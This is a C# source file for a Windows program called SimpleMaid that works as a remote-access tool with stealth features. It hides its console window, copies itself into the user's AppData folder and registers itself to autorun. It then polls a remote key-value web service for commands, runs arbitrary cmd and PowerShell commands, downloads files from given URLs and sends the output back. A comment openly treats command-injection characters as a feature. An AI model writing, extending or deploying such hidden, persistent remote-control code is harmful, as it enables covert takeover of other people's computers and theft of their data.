using IniParser;
using IniParser.Model;
using System;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using static SimpleMaid.NativeMethods;
using static SimpleMaid.PasswordStrength;

namespace SimpleMaid
{
  class Program
  {
    //TODOS + убрать все private, эксперимент с static и инициализацией (как можно меньше инициализации здесь, но если она не на своём месте, то здесь)
    //SEARCH: String.Format, Console.Write, +, Set, Get
    #region Properties
    public static bool Hidden { get; set; } = false;
    public static string State { set { Console.Title = $"{Application.ProductName}: {value}"; } }
    #endregion

    private static DirectoryInfo desiredAppDirectory;
    private static FileInfo mainConfigFile;
    private static IntPtr handle;
    private static Mutex  programMutex;
    private static PasswordScore minimalPasswordStrength = PasswordScore.Weak;

    #region Global threads
    private static Thread connectionThread;
    private static Thread commandThread;
    private static Thread chatThread;

    private static volatile bool busyCommandWise = false;
    private static volatile bool busyChatWise = false;
    #endregion
    private static volatile bool internetAlive = true;

    #region Global settings
    // TODO: Get rid of these
    private static volatile string machine;
    private static volatile string pass;
    #endregion

    #region Across forms
    public static frmChatWindow ChatboxWindow = null;
    public static volatile bool ChatboxExit = false;
    public static volatile string ChatMessage;
    public static volatile string ChatCommand;
    #endregion


    public static string Set(string tag, string value)
    {
      tag = Application.ProductName + "_" + tag;

      UTF8Encoding encoding = new UTF8Encoding();
      byte[] requestBody = encoding.GetBytes("tag=" + tag + "&value=" + value + "&fmt=html");

      HttpWebRequest request = (HttpWebRequest)WebRequest.Create(resources.ServerAddress + "storeavalue");
      request.Method = "POST";
      request.Credentials = CredentialCache.DefaultCredentials;
      request.ContentType = "application/x-www-form-urlencoded";
      request.ContentLength = requestBody.Length;

      try
      {
        using (var requestStream = request.GetRequestStream())
        {
          requestStream.Write(requestBody, 0, requestBody.Length);
        }
      }
      catch (WebException)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }
      try { using (var response = request.GetResponse()) ;}
      catch (WebException)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }

      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Gray;
      Console.WriteLine("SET  {0}  {1}\n", tag, value);

      return String.Empty;
    }

    public static string Get(string tag)
    {
      tag = Application.ProductName + "_" + tag;

      string value;

      UTF8Encoding encoding = new UTF8Encoding();
      byte[] requestBody = encoding.GetBytes("tag=" + tag + "&fmt=html");

      HttpWebRequest request = (HttpWebRequest)WebRequest.Create(resources.ServerAddress + "getvalue");
      request.Method = "POST";
      request.Credentials = CredentialCache.DefaultCredentials;
      request.ContentType = "application/x-www-form-urlencoded";
      request.ContentLength = requestBody.Length;

      try
      {
        using (var requestStream = request.GetRequestStream())
        {
          requestStream.Write(requestBody, 0, requestBody.Length);
        }
      }
      catch (WebException)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }

      // TODO: Refactor
      try
      {
        using (var response = request.GetResponse())
        using (var responseStream = response.GetResponseStream())
        using (var sr = new StreamReader(responseStream))
        {
          value = sr.ReadToEnd();
          value = value.Substring(value.IndexOf(tag) + tag.Length + 4);
          value = value.Remove(value.IndexOf("\""));
        }
      }
      catch (WebException)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }

      // TODO: Rewrite - problems with decoding
      value = decodeEncodedNonAsciiCharacters(value);
      value = value.Replace(@"\/", @"/");
      value = value.Replace(@"\\", @"\");
      value = WebUtility.HtmlDecode(value);

      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkGreen;
      Console.WriteLine("GET  {0}  {1}\n", tag, value);

      return value;
    }


    [STAThread]
    static void Main(string[] args)
    {
      System.Windows.Forms.Application.EnableVisualStyles();
      Console.Clear();

      desiredAppDirectory = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Application.CompanyName, Application.ProductName));
      mainConfigFile = new FileInfo(Path.Combine(desiredAppDirectory.FullName, resources.ConfigName));

      // TODO: Reduce perfomance hit (single array search, not multiple), modify class SimpleConsole.Arguments, ?modify class SimpleConsole
      #region Console arguments
      bool rogueArgFound = false;
      bool autorunArgFound = false;
      bool passArgFound = false; // <-- only need it for clarity

      string passArg = resources.DefaultPassword;
      string langArg = CultureInfo.InstalledUICulture.Name;

      if (args.Length >= 1)
      {
        rogueArgFound = SimpleConsole.Arguments.CheckPresence(resources.RogueArgument, args);
        autorunArgFound = SimpleConsole.Arguments.CheckPresence(resources.AutorunArgument, args);
        if (args.Length >= 2)
        {
          for (int i = 0; i < args.Length; ++i)
          {
            if (args[i] == resources.PasswordArgument)
            {
              passArg = args[i + 1];
              passArgFound = true;
            }
            else if (args[i] == resources.LanguageArgument)
            {
              langArg = args[i + 1];
            }
          }
        }
      }
      #endregion

      #region Handle autorun
      handle = GetConsoleWindow();
      bool inDesiredDir = desiredAppDirectory.IsEqualTo(Application.StartupPath);
      if (inDesiredDir || rogueArgFound)
      {
        ShowWindow(handle, SW_HIDE);
        Program.Hidden = true;
      }
      #endregion

      #region Localization
      CultureInfo.DefaultThreadCurrentCulture = CultureInfo.GetCultureInfo(langArg);
      CultureInfo.DefaultThreadCurrentUICulture = CultureInfo.GetCultureInfo(langArg);
      #endregion

      #region OS/priveleges check
      if (SimplePlatform.Platform.Unix == SimplePlatform.runningPlatform())
      {
        reportGeneralError(resources.OSErrorMessage);
        exit();
      }
      else
      {
        if (SimpleApp.IsElevated())
        {
          reportGeneralError(resources.AdminErrorMessage);
          exit();
        }
      }
      #endregion

      // TODO: Move so it happens AFTER startup directory management
      #region Handle previous instance
      programMutex = new Mutex(false, "Local\\" + Application.AssemblyGuid);
      if (!programMutex.WaitOne(0, false))
      {
        reportPastSelf();
        exit();
      }
      #endregion

      #region Startup directory management
      if (!inDesiredDir)
      {
        var svtFolder = new DirectoryInfo(ConfigurationManager.AppSettings["SvtFolderName"]); // <-- relative, ?make absolute
        string[] filePaths = { Application.ExecutablePath, ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None).FilePath, //AppDomain.CurrentDomain.SetupInformation.ConfigurationFile
          Assembly.GetAssembly(typeof(FileIniDataParser)).Location };
        try
        {
          svtFolder.CopyTo(desiredAppDirectory, false);
          foreach (var filePath in filePaths)
          {
            File.Copy(filePath, Path.Combine(desiredAppDirectory.FullName, Path.GetFileName(filePath)), true);
          }
        }
        catch //unauthorized, io, notsupported
        {
          // 1. stop other instance using guid technique
          //   if there is no other instance running, (?recursive or ?continue)
          // 2. try to copy again
          //   if unlucky, (?recursive or ?continue)
          // 3. start that instance (?with a delay through .bat file)
          // 4. exit
        }
      }
      #endregion

      #region Necessary INI declarations
      var config_parser = new FileIniDataParser();
      IniData configuration;
      #endregion

      #region Settings to read
      bool   machineConfigured = false;
      string machineName       = createMachine();
      string machinePassword   = passArg;
      bool   autoRun           = !autorunArgFound;
      #endregion

      #region Compose configuration file
      bool firstRun;
      bool promptShown = false;
      if (firstRun = !mainConfigFile.Exists)
      {
        configuration = new IniData();

        configuration.Sections.AddSection("Service");

        configuration["Service"].AddKey("bMachineConfigured", machineConfigured.ToString());
        configuration["Service"].AddKey("sMachineName", machineName);
        #region configuration["Service"].AddKey("sMachinePassword", machinePassword);
        if (!isPasswordOK(machinePassword))
        {
          if (Program.Hidden)
            ShowWindow(handle, SW_SHOW);

          string passwordValue;
          while (!isPasswordOK(passwordValue = new NetworkCredential(String.Empty, passwordPrompt()).Password))
          {
            reportWeakPassword(passwordValue);
          }
          configuration["Service"].AddKey("sMachinePassword", passwordValue);
          promptShown = true;

          if (Program.Hidden)
            ShowWindow(handle, SW_HIDE);
        }
        else
        {
          configuration["Service"].AddKey("sMachinePassword", machinePassword);
        }
        #endregion
        #region configuration["Service"].AddKey("bAutoRun", autoRun.ToString());
        configuration["Service"].AddKey("bAutoRun", autoRun.ToString());
        #endregion
      }
      else
      {
        configuration = config_parser.ReadFile(mainConfigFile.FullName, Encoding.UTF8);

        machineConfigured = bool.Parse(configuration["Service"]["bMachineConfigured"]);
        #region machineName = configuration["Service"]["sMachineName"];
        if (resources.KeywordDefault != configuration["Service"]["sMachineName"])
        {
          machineName = configuration["Service"]["sMachineName"];
        }
        else
        {
          configuration["Service"]["sMachineName"] = machineName;
          machineConfigured = false;
        }
        #endregion
        #region machinePassword = configuration["Service"]["sMachinePassword"];
        machinePassword = configuration["Service"]["sMachinePassword"];

        if (!passArgFound)
        {
          if (!isPasswordOK(machinePassword))
          {
            if (Program.Hidden)
              ShowWindow(handle, SW_SHOW);

            string passwordValue;
            while (!isPasswordOK(passwordValue = new NetworkCredential(String.Empty, passwordPrompt()).Password))
            {
              reportWeakPassword(passwordValue);
            }
            configuration["Service"]["sMachinePassword"] = passwordValue;
            promptShown = true;
            machinePassword = configuration["Service"]["sMachinePassword"];

            if (Program.Hidden)
              ShowWindow(handle, SW_HIDE);
          }
        }
        else
        {
          if (isPasswordOK(passArg))
          {
            configuration["Service"]["sMachinePassword"] = passArg;
            machinePassword = configuration["Service"]["sMachinePassword"];
          }
          else
          {
            if (!isPasswordOK(machinePassword))
            {
              if (Program.Hidden)
                ShowWindow(handle, SW_SHOW);

              string passwordValue;
              while (!isPasswordOK(passwordValue = new NetworkCredential(String.Empty, passwordPrompt()).Password))
              {
                reportWeakPassword(passwordValue);
              }
              configuration["Service"]["sMachinePassword"] = passwordValue;
              promptShown = true;
              machinePassword = configuration["Service"]["sMachinePassword"];

              if (Program.Hidden)
                ShowWindow(handle, SW_HIDE);
            }
          }
        }
        #endregion
        #region autoRun = bool.Parse(configuration["Service"]["bAutoRun"])
        if (!autorunArgFound)
        {
          autoRun = bool.Parse(configuration["Service"]["bAutoRun"]);
        }
        else
        {
          configuration["Service"]["bAutoRun"] = (!bool.Parse(configuration["Service"]["bAutoRun"])).ToString();
          autoRun = bool.Parse(configuration["Service"]["bAutoRun"]);
        }
        #endregion
      }
      #endregion

      // TODO: Get rid of these
      machine = machineName;
      pass = machinePassword;

      #region Enable/disable autorun
      if (autoRun)
        SimpleApp.SwitchAutorun(Application.ProductName, Path.Combine(desiredAppDirectory.FullName, Path.GetFileName(Application.ExecutablePath)));
      else
        SimpleApp.SwitchAutorun(Application.ProductName);
      #endregion

      #region Configure machine
      if (!machineConfigured)
      {
        string machines = getMachinesList();

        if (!machines.Contains(machine))
        {
          while (resources.WebErrorMessage == Set("machines", $"{machines}{machine}:"))
          {
            Thread.Sleep(1000);
          }
        }
      }
      #endregion

      #region Update INI file
      if (firstRun || !machineConfigured || autorunArgFound || passArgFound || promptShown)
      {
        machineConfigured = true;
        configuration["Service"]["bMachineConfigured"] = machineConfigured.ToString();

        config_parser.WriteFile(mainConfigFile.FullName, configuration, Encoding.UTF8);
      }
      #endregion

      #region 1 - Time Thread
      var timeThread = new Thread(sendMachineTime);
      timeThread.IsBackground = true;
      timeThread.Start();
      #endregion
      Thread.Sleep(1000);

      #region 2 - Connection Thread
      connectionThread = new Thread(handleConnection);
      connectionThread.IsBackground = true;
      connectionThread.Start();
      #endregion

      #region 3 - Command Thread
      commandThread = new Thread(awaitCommands);
      commandThread.IsBackground = true;
      // Starts in a different place
      #endregion

      #region 4 - Chat Thread
      chatThread = new Thread(fetchMessages);
      chatThread.IsBackground = true;
      // Starts in a different place
      #endregion

      timeThread.Join();
    }


    private static void exit()
    {
      Thread.Sleep(int.Parse(resources.GeneralCloseDelay));
      Environment.Exit(0);
    }

    private static string createMachine()
    {
      // TODO: Use MAC address?
      return Guid.NewGuid().ToString();
    }

    private static string getMachinesList()
    {
      // Simple hack to bypass 500 characters limit
      int listIndex = -1;
      string listTest;
      do
      {
        listIndex++;
        while (resources.WebErrorMessage == (listTest = Get("machines" + listIndex)))
        {
          Thread.Sleep(1000);
        }
      } while (listTest.Length >= int.Parse(resources.IndividualValueLimit));

      string machinesList;
      while (resources.WebErrorMessage == (machinesList = Get("machines" + listIndex)))
      {
        Thread.Sleep(1000);
      }
      return machinesList;
    }

    private static bool isPasswordOK(string p)
    {
      var strength = CheckStrength(p);

      Program.State = $"Running, {nameof(PasswordStrength)}: {strength}";

      return (strength >= minimalPasswordStrength) ? true : false;
    }

    // HACK (to get the actual value, not an object): new NetworkCredential(String.Empty, passwordPrompt()).Password
    private static SecureString passwordPrompt()
    {
      Console.Clear();
      Console.CursorVisible = true;

      string middlePractical = "| " + resources.PasswordEnterTip;
      string middle = middlePractical + " |";
      middle = middlePractical + SimpleConsole.Line.GetFilled(' ').Remove(0, middle.Length) + " |";

      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.Write(middle);
      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.SetCursorPosition(middlePractical.Length, Console.CursorTop - 2);

      ConsoleKeyInfo keyInfo;
      var passHolder = new SecureString();
      int starsCount = 0;
      int middleDiff = middle.Length - middlePractical.Length;
      while ((keyInfo = Console.ReadKey(true)).Key != ConsoleKey.Enter)
      {
        if (keyInfo.Key != ConsoleKey.Backspace)
        {
          /*if (!((int)ki.Key >= 65 && (int)ki.Key <= 90))
            continue;*/ // <-- stricter, but disallows digits
          if (char.IsControl(keyInfo.KeyChar))
            continue;

          if (starsCount + 1 < middleDiff)
            ++starsCount;
          else
            continue;

          passHolder.AppendChar(keyInfo.KeyChar);

          Console.Write('*');
        }
        else
        {
          if (starsCount - 1 >= 0)
            --starsCount;
          else
            continue;

          passHolder.RemoveAt(passHolder.Length - 1);

          SimpleConsole.Line.ClearCurrent();
          Console.Write(middlePractical);
          for (int i = 0; i < starsCount; ++i)
          {
            Console.Write('*');
          }
          var pos = new Point(Console.CursorLeft, Console.CursorTop);
          Console.Write(SimpleConsole.Line.GetFilled(' ').Remove(0, middlePractical.Length + starsCount + " |".Length) + " |");
          Console.SetCursorPosition(pos.X, pos.Y);
        }

        if (starsCount == 0)
        {
          Console.Beep();
        }
        if (starsCount + 1 == middleDiff)
        {
          Console.SetCursorPosition(Console.CursorLeft - 1, Console.CursorTop);
          Console.Beep();
        }
      }

      Console.Clear();

      return passHolder;
    }

    // TODO: Get filename from Response.Header
    private static string urlToFile(string url)
    {
      string[] urlParts = url.Split(new char[] { '/' }, StringSplitOptions.RemoveEmptyEntries);

      return Uri.UnescapeDataString(urlParts[urlParts.Length - 1]);
    }

    // TODO: Implement adequate decoding
    private static string decodeEncodedNonAsciiCharacters(string value)
    {
      return Regex.Replace(
          value,
          @"\\u(?<Value>[a-zA-Z0-9]{4})",
          m =>
          {
            return ((char)int.Parse(m.Groups["Value"].Value, NumberStyles.HexNumber)).ToString();
          });
    }

    #region Reports
    private static void reportWeakPassword(string pas)
    {
      string middlePractical = "| " + resources.PasswordWeakHint;
      string middle = middlePractical + " |";
      middle = middlePractical + SimpleConsole.Line.GetFilled(' ').Remove(0, middle.Length) + " |";

      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.Write(middle);
      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.CursorVisible = false;

      pas = null;
      Thread.Sleep(int.Parse(resources.PasswordWeakDelay));

      Console.CursorVisible = true;
    }

    private static void reportGeneralError(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Blue;
      Console.ForegroundColor = ConsoleColor.White;
      Console.WriteLine(msg + "\n");

      if (Program.Hidden)
      {
        ShowWindow(handle, SW_SHOW);
        Console.Beep();
        Thread.Sleep(int.Parse(resources.GeneralCloseDelay));
        ShowWindow(handle, SW_HIDE);
      }
    }

    private static void reportWebError()
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkYellow;
      Console.WriteLine(resources.WebErrorMessage + "\n");
    }

    private static void reportPastSelf()
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkMagenta;
      Console.WriteLine(resources.PastSins + "\n");
    }

    private static void reportThreadStart(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Cyan;
      Console.WriteLine(msg + "\n");
      if (resources.CommandStart == msg)
        Console.Beep();
    }

    private static void reportThreadStop(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Red;
      Console.WriteLine(msg + "\n");
      if (resources.CommandStop == msg)
        Console.Beep();
    }
    #endregion

    private static void openChatWindow()
    {
      busyChatWise = true;

      ChatboxWindow = new frmChatWindow();
      ChatboxWindow.ShowDialog();

      // ! code below only executes after ChatboxWindow is closed

      ChatboxExit = false;

      busyChatWise = false;

      while (resources.WebErrorMessage == Set($"commands.{machine}", $"{resources.AnswerPrefix}{resources.MessageCommand},{ChatboxWindow.Visible}"))
      {
        Thread.Sleep(1000);
      }
    }

    private static void closeChatWindow()
    {
      busyChatWise = false;

      ChatboxExit = true;
    }

    private static string executeCommand(string command, bool usePowershell)
    {
      ProcessStartInfo procStartInfo;
      if (!usePowershell)
      {
        procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
      }
      else
      {
        procStartInfo = new ProcessStartInfo("powershell", "-command " + command);
      }

      procStartInfo.RedirectStandardOutput = true;
      procStartInfo.UseShellExecute = false;
      procStartInfo.CreateNoWindow = true;

      Process proc = new Process();
      proc.StartInfo = procStartInfo;
      proc.Start();

      string result = proc.StandardOutput.ReadToEnd();

      result = result.Replace(Environment.NewLine, @"\n");

      return result;
    }


    private static void resurrectDeadThreads()
    {
      if (null != connectionThread && !connectionThread.IsAlive)
      {
        connectionThread = new Thread(handleConnection);
        connectionThread.IsBackground = true;
        connectionThread.Start();
      }
      if (busyCommandWise && null != commandThread && !commandThread.IsAlive)
      {
        commandThread = new Thread(awaitCommands);
        commandThread.IsBackground = true;
        commandThread.Start();
      }
      if (busyChatWise && null != chatThread && !chatThread.IsAlive)
      {
        chatThread = new Thread(fetchMessages);
        chatThread.IsBackground = true;
        chatThread.Start();
      }
    }

    private static void sendMachineTime()
    {
      reportThreadStart(resources.TimeStart);

      while (true)
      {
        var now = DateTime.Now;

        if (resources.WebErrorMessage !=
          Set($"time.{machine}", $"{now.ToShortDateString()} {now.ToLongTimeString()}"))
        {
          if (!internetAlive)
            resurrectDeadThreads();

          internetAlive = true;
        }

        Thread.Sleep(1000 - now.Millisecond);
      }
    }

    private static void handleConnection()
    {
      reportThreadStart(resources.ConnectionStart);

      while (internetAlive)
      {
        if (Get(machine) == pass)
        {
          busyCommandWise = !busyCommandWise;
          while (resources.WebErrorMessage == Set(machine, String.Empty))
          {
            Thread.Sleep(1000);
          }

          if (busyCommandWise && null != commandThread && !commandThread.IsAlive)
          {
            commandThread = new Thread(awaitCommands);
            commandThread.IsBackground = true;
            commandThread.Start();
          }
        }

        Thread.Sleep(1000);
      }

      reportThreadStop(resources.ConnectionStop);
    }

    private static void fetchMessages()
    {
      reportThreadStart(resources.ChatStart);

      string ans = resources.AnswerPrefix;
      string sep = resources.CommandsSeparator;

      /* Command shortcuts here */

      string sRemoteMessageOld = null;
      while (busyChatWise && internetAlive)
      {
        string sRemoteMessage;
        while (resources.WebErrorMessage == (sRemoteMessage = Get("messages." + machine)))
        {
          Thread.Sleep(1000);
        }

        if (String.Empty == sRemoteMessage || sRemoteMessage.StartsWith(ans))
        {
          Thread.Sleep(1000);
          continue;
        }

        #region Parsing message
        string[] message_parts = sRemoteMessage.Split(new char[] { char.Parse(sep) },
          StringSplitOptions.RemoveEmptyEntries);

        //частный случай m, еще две то есть
        ChatMessage = message_parts[0];
        //ChatCommand = message_parts[1];
        //показал окно чата или скрыл

        while (resources.WebErrorMessage == Set("messages." + machine, String.Empty))
        {
          Thread.Sleep(1000);
        }
        #endregion

        Thread.Sleep(1000);
      }

      reportThreadStop(resources.ChatStop);
    }

    // TODO: Change shortcuts to const
    private static void awaitCommands()
    {
      reportThreadStart(resources.CommandStart);

      string ans = resources.AnswerPrefix;
      string sep = resources.CommandsSeparator;

      string rep = resources.RepeatCommand;
      string pow = resources.PowershellCommand;
      //string key = resources.KeyhookCommand; /* app.State = Control.IsKeyLocked(Keys.CapsLock) ? "CAPS LOCK" : app.State; */
      string mes = resources.MessageCommand;
      string dow = resources.DownloadCommand;
      string sho = resources.ShowCommand;
      string hid = resources.HideCommand;
      string qui = resources.QuitCommand;

      while (busyCommandWise && internetAlive)
      {
        string sRemoteCommand;
        while (resources.WebErrorMessage == (sRemoteCommand = Get("commands." + machine)))
        {
          Thread.Sleep(1000);
        }

        if (String.Empty == sRemoteCommand || sRemoteCommand.StartsWith(ans))
        {
          Thread.Sleep(1000);
          continue;
        }

        // TODO: Rewrite using switch-case, exitCommand() should return answer
        #region Parsing command
        string[] command_parts = sRemoteCommand.Split(new char[] { char.Parse(sep) },
          StringSplitOptions.RemoveEmptyEntries);
        // Contains delimiter: if (command_parts[0] != sRemoteCommand)

        if (!Regex.IsMatch(sRemoteCommand, "^.;.*"))
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + executeCommand(sRemoteCommand, false)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (rep == command_parts[0] && command_parts.Length >= 2)
        {
          if (!Regex.IsMatch(sRemoteCommand, "^.;.;.*"))
          {
            executeCommand(command_parts[1], false);
          }
          else if (pow == command_parts[1])
          {
            string[] command_parts_fixed = new string[command_parts.Length - 1];
            for (int i = 1; i < command_parts.Length; ++i)
            {
              command_parts_fixed[i - 1] = command_parts[i];
            }

            powershellCommand(command_parts_fixed);
          }
          else
          {
            reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
          }
        }
        else if (pow == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + powershellCommand(command_parts)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (mes == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + messageCommand(command_parts)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (dow == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + downloadCommand(command_parts)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (sho == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + showCommand()))
          {
            Thread.Sleep(1000);
          }
        }
        else if (hid == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + hideCommand()))
          {
            Thread.Sleep(1000);
          }
        }
        else if (qui == command_parts[0])
        {
          exitCommand();
        }
        else
        {
          reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
        }
        #endregion
        
        Thread.Sleep(1000);
      }

      reportThreadStop(resources.CommandStop);
    }


    private static void exitCommand()
    {
      Environment.Exit(0);
    }

    private static string hideCommand()
    {
      if (Program.Hidden) return resources.GeneralOKMessage;

      ShowWindow(handle, SW_HIDE);
      Program.Hidden = true;

      return resources.GeneralOKMessage;
    }

    private static string showCommand()
    {
      if (!Program.Hidden) return resources.GeneralOKMessage;

      ShowWindow(handle, SW_SHOW);
      Program.Hidden = false;

      return resources.GeneralOKMessage;
    }

    private static string downloadCommand(string[] command_parts)
    {
      if (command_parts.Length < 2)
      {
        return resources.IncompleteCommandErrMsg;
      }

      string download_dir = null;
      string download_file = null;

      bool quickDownload;
      if ((quickDownload = (command_parts.Length == 2)) || "d" == command_parts[2])
      {
        download_dir = String.Format("{0}{1}\\", Path.GetTempPath(), Guid.NewGuid().ToString().ToUpper());
        download_file = urlToFile(command_parts[1]);
      }
      // TODO: Атаки типа "& && ||" - не баг, а фича!
      else if (command_parts.Length >= 3)
      {
        string ev = resources.EvaluateCmdVariable;

        int indexOfCmdVariable = command_parts[2].IndexOf(resources.EvaluateCmdVariable);

        if (-1 != indexOfCmdVariable)
        {
          char evd = char.Parse(resources.EvaluateCmdVariableEnd);

          var indexesOfCmdVariables = command_parts[2].AllIndexesOf(ev);

          int diff = 0;
          foreach (int index in indexesOfCmdVariables)
          {
            string variable = command_parts[2].Pacmanise(index + ev.Length - diff, evd);

            /*if (variable.Contains(" "))
            {
              reportGeneralError(resources.OldnewErrorMessage);
              return;
            }*/

            string unEvaluatedVariable = ev + variable + evd;
            string evaluatedVariable = executeCommand("echo " + variable, false);
            command_parts[2] = command_parts[2].Replace(unEvaluatedVariable, evaluatedVariable);

            diff += unEvaluatedVariable.Length - evaluatedVariable.Length;
          }
        }

        download_dir = Path.GetDirectoryName(command_parts[2]) + "\\";
        download_file = Path.GetFileName(command_parts[2]);
      }

      Directory.CreateDirectory(download_dir);

      // TODO: Use my FTP
      using (var wc = new WebClient())
      {
        try
        {
          wc.DownloadFile(new Uri(command_parts[1]), download_dir + download_file);
        }
        catch (Exception exc)
        {
          return exc.Message;
        }

        if (quickDownload)
          Process.Start(download_dir);
        
        return download_dir + download_file;
      }
    }

    private static string messageCommand(string[] command_parts)
    {
      if (ChatboxWindow == null || ChatboxWindow.IsDisposed)
      {
        #region 3.5 - ChatBox Thread
        var chatboxThread = new Thread(openChatWindow);
        chatboxThread.IsBackground = true;
        chatboxThread.Start();
        #endregion

        while (null == ChatboxWindow || !ChatboxWindow.Visible)
        {
          Thread.Sleep(1000);
        }

        #region 4 - Chat Thread
        if (busyChatWise && null != chatThread && !chatThread.IsAlive)
        {
          chatThread = new Thread(fetchMessages);
          chatThread.IsBackground = true;
          chatThread.Start();
        }
        #endregion
      }
      else
      {
        closeChatWindow();
      }

      return $"{resources.MessageCommand},{ChatboxWindow.Visible}";
    }

    private static string powershellCommand(string[] command_parts)
    {
      if (command_parts.Length < 2)
      {
        return resources.IncompleteCommandErrMsg;
      }

      for (int i = 2; i < command_parts.Length; ++i)
      {
        command_parts[1] += "; " + command_parts[i];
      }
      command_parts[1] = command_parts[1].Replace(@"""", @"\""");

      return executeCommand(command_parts[1], true);
    }
  }
}
